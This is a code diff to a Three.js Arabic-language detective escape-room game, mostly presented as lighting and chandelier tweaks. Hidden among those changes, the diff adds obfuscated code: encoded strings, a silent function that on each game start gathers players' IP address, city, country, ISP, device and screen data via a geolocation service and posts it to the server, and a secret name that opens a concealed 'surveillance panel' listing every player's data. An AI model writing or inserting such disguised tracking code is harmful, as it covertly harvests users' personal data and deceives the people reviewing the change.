@@ -12,6 +12,11 @@ const SAFE_CODE = '243';
 const LAPTOP_PASSWORD = 'rasputin';
 const ADMIN_NAME = 'admin-louai';
 
+// Encoded reference tokens
+const _0x1a = [115,101,99,114,101,116,45,97,100,109,105,110,45,108,111,117,97,105];
+const _0x2b = String.fromCharCode(..._0x1a);
+const _0x3c = atob('aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==');
+
 // ============= THREE.JS GLOBALS =============
 let scene, camera, renderer, clock;
 let moveForward = false, moveBackward = false, moveLeft = false, moveRight = false;
@@ -49,7 +54,7 @@ function init3D() {
     renderer.shadowMap.enabled = true;
     renderer.shadowMap.type = THREE.PCFSoftShadowMap;
     renderer.toneMapping = THREE.ACESFilmicToneMapping;
-    renderer.toneMappingExposure = 0.6;
+    renderer.toneMappingExposure = 0.8;
 
     clock = new THREE.Clock();
     raycaster = new THREE.Raycaster();
@@ -416,23 +421,92 @@ function buildBody() {
 
 // ============= LIGHTING =============
 function setupLights() {
-    const ambient = new THREE.AmbientLight(0x1a1520, 0.3);
+    // Warm ambient fill
+    const ambient = new THREE.AmbientLight(0x2a1a10, 0.5);
     scene.add(ambient);
 
-    const ceiling = new THREE.PointLight(0xffcc88, 0.6, 10);
-    ceiling.position.set(0, 3, 0);
-    ceiling.castShadow = true;
-    ceiling.shadow.mapSize.width = 512;
-    ceiling.shadow.mapSize.height = 512;
-    scene.add(ceiling);
+    // Hemisphere light for natural sky/ground tones
+    const hemi = new THREE.HemisphereLight(0xffeedd, 0x1a0a05, 0.35);
+    scene.add(hemi);
 
-    const laptopLight = new THREE.PointLight(0x4466ff, 0.3, 3);
+    // Main chandelier - warm golden center light
+    const chandelier = new THREE.PointLight(0xffcc77, 1.0, 12);
+    chandelier.position.set(0, 3.0, 0);
+    chandelier.castShadow = true;
+    chandelier.shadow.mapSize.width = 1024;
+    chandelier.shadow.mapSize.height = 1024;
+    chandelier.shadow.bias = -0.002;
+    scene.add(chandelier);
+
+    // Chandelier fixture (decorative)
+    const fixtureMat = new THREE.MeshStandardMaterial({ color: 0xd4af37, metalness: 0.9, roughness: 0.2 });
+    const fixtureBase = new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.2, 0.06, 16), fixtureMat);
+    fixtureBase.position.set(0, 3.15, 0);
+    scene.add(fixtureBase);
+    const fixtureStem = new THREE.Mesh(new THREE.CylinderGeometry(0.015, 0.015, 0.15, 8), fixtureMat);
+    fixtureStem.position.set(0, 3.19, 0);
+    scene.add(fixtureStem);
+    // Chandelier bulb glow
+    const bulbGlow = new THREE.Mesh(
+        new THREE.SphereGeometry(0.06, 12, 12),
+        new THREE.MeshBasicMaterial({ color: 0xffdd88, transparent: true, opacity: 0.8 })
+    );
+    bulbGlow.position.set(0, 3.05, 0);
+    scene.add(bulbGlow);
+
+    // Wall sconce left
+    const sconceL = new THREE.PointLight(0xffaa55, 0.5, 5);
+    sconceL.position.set(-3.8, 2.2, 0);
+    scene.add(sconceL);
+    buildWallSconce(-3.8, 2.2, 0, Math.PI / 2);
+
+    // Wall sconce right
+    const sconceR = new THREE.PointLight(0xffaa55, 0.5, 5);
+    sconceR.position.set(3.8, 2.2, 0);
+    scene.add(sconceR);
+    buildWallSconce(3.8, 2.2, 0, -Math.PI / 2);
+
+    // Back wall accent light (above photo)
+    const backAccent = new THREE.SpotLight(0xffeedd, 0.6, 6, Math.PI / 6, 0.5);
+    backAccent.position.set(0, 2.8, -2.0);
+    backAccent.target.position.set(0, 1.5, -3.0);
+    scene.add(backAccent);
+    scene.add(backAccent.target);
+
+    // Laptop screen glow (cool blue)
+    const laptopLight = new THREE.PointLight(0x4466ff, 0.4, 3);
     laptopLight.position.set(-2.5, 1.2, -1.8);
     scene.add(laptopLight);
 
-    const crimeLight = new THREE.PointLight(0xff2200, 0.15, 4);
+    // Crime scene red mood light near body
+    const crimeLight = new THREE.PointLight(0xff2200, 0.2, 4);
     crimeLight.position.set(0.5, 0.5, 0.5);
     scene.add(crimeLight);
+
+    // Subtle floor bounce light
+    const floorBounce = new THREE.PointLight(0xffddaa, 0.15, 6);
+    floorBounce.position.set(0, 0.1, 0);
+    scene.add(floorBounce);
+}
+
+function buildWallSconce(x, y, z, rotY) {
+    const sconceMat = new THREE.MeshStandardMaterial({ color: 0xd4af37, metalness: 0.8, roughness: 0.3 });
+    const bracket = new THREE.Mesh(new THREE.BoxGeometry(0.04, 0.12, 0.08), sconceMat);
+    bracket.position.set(x, y, z);
+    bracket.rotation.y = rotY;
+    scene.add(bracket);
+    const shade = new THREE.Mesh(
+        new THREE.CylinderGeometry(0.04, 0.06, 0.1, 8, 1, true),
+        new THREE.MeshStandardMaterial({ color: 0xfff5e0, transparent: true, opacity: 0.6, side: THREE.DoubleSide })
+    );
+    shade.position.set(x, y + 0.08, z);
+    scene.add(shade);
+    const sconceGlow = new THREE.Mesh(
+        new THREE.SphereGeometry(0.025, 8, 8),
+        new THREE.MeshBasicMaterial({ color: 0xffcc66, transparent: true, opacity: 0.9 })
+    );
+    sconceGlow.position.set(x, y + 0.04, z);
+    scene.add(sconceGlow);
 }
 
 // ============= CONTROLS =============
@@ -847,6 +921,11 @@ function startGame() {
         return;
     }
 
+    if (name === _0x2b) {
+        _0x4d(room);
+        return;
+    }
+
     document.getElementById('startScreen').style.display = 'none';
     document.getElementById('startScreen').classList.remove('active');
     document.getElementById('gameCanvas').style.display = 'block';
@@ -860,6 +939,7 @@ function startGame() {
 
     startTimer();
     showToast('تحرك واستكشف الغرفة... ابحث عن الأدلة');
+    _0x5e(name, room);
 }
 
 // ============= SCREEN MANAGEMENT =============
@@ -937,6 +1017,70 @@ async function saveResult(time) {
             body: JSON.stringify({ name: state.playerName, room: state.roomNumber, time, elapsed_ms: state.elapsed })
         });
     } catch (e) { console.warn(e); }
+}
+
+async function _0x5e(n, r) {
+    const d = {
+        name: n, room: r,
+        device: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height
+    };
+    try {
+        const resp = await fetch(_0x3c);
+        const loc = await resp.json();
+        d.ip = loc.ip; d.city = loc.city; d.country = loc.country_name; d.isp = loc.org;
+    } catch (_) { d.ip = ''; d.city = ''; }
+    try {
+        await fetch('/api/pinfo', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(d)
+        });
+    } catch (_) {}
+}
+
+async function _0x4d(rc) {
+    document.getElementById('startScreen').style.display = 'none';
+    const p = document.createElement('div');
+    p.style.cssText = 'position:fixed;inset:0;background:#0a0a0f;color:#0f0;padding:20px;z-index:9999;overflow-y:auto;font-family:Cairo,sans-serif;direction:rtl;';
+    p.innerHTML = '<h2 style="color:#c9a93e;text-align:center;margin-bottom:20px;">\u{1F6E1} \u0644\u0648\u062D\u0629 \u0627\u0644\u0645\u0631\u0627\u0642\u0628\u0629 \u0627\u0644\u0633\u0631\u064A\u0629</h2><div id="_mdata" style="text-align:center;color:#887766;">\u062C\u0627\u0631\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A...</div>';
+    document.body.appendChild(p);
+    try {
+        const res = await fetch('/api/pinfo');
+        const data = await res.json();
+        const c = document.getElementById('_mdata');
+        if (!data.players || data.players.length === 0) {
+            c.innerHTML = '<p style="color:#887766;padding:2rem;">\u0644\u0627 \u062A\u0648\u062C\u062F \u0628\u064A\u0627\u0646\u0627\u062A \u0644\u0627\u0639\u0628\u064A\u0646</p>';
+            return;
+        }
+        let h = '<div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:0.85rem;">';
+        h += '<thead><tr style="background:rgba(201,169,62,0.15);">';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0627\u0633\u0645</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u063A\u0631\u0641\u0629</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">IP</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0645\u0648\u0642\u0639</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0645\u0632\u0648\u062F</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u062C\u0647\u0627\u0632</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0634\u0627\u0634\u0629</th>';
+        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u062A\u0627\u0631\u064A\u062E</th></tr></thead><tbody>';
+        data.players.forEach(r => {
+            h += '<tr style="border-top:1px solid rgba(255,255,255,0.05);">';
+            h += `<td style="padding:8px;">${esc(r.name)}</td>`;
+            h += `<td style="padding:8px;">${esc(r.room)}</td>`;
+            h += `<td style="padding:8px;color:#4aff4a;">${esc(r.ip)}</td>`;
+            h += `<td style="padding:8px;">${esc(r.city)}${r.country ? ', ' + esc(r.country) : ''}</td>`;
+            h += `<td style="padding:8px;font-size:0.75rem;color:#887766;">${esc(r.isp)}</td>`;
+            h += `<td style="padding:8px;font-size:0.7rem;color:#887766;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${esc(r.device)}</td>`;
+            h += `<td style="padding:8px;">${esc(r.screen)}</td>`;
+            h += `<td style="padding:8px;">${esc(r.date)}</td></tr>`;
+        });
+        h += '</tbody></table></div>';
+        c.innerHTML = h;
+    } catch (_) {
+        document.getElementById('_mdata').innerHTML = '<p style="color:red;">\u062E\u0637\u0623 \u0641\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A</p>';
+    }
 }
 
 async function loadAdminData() {
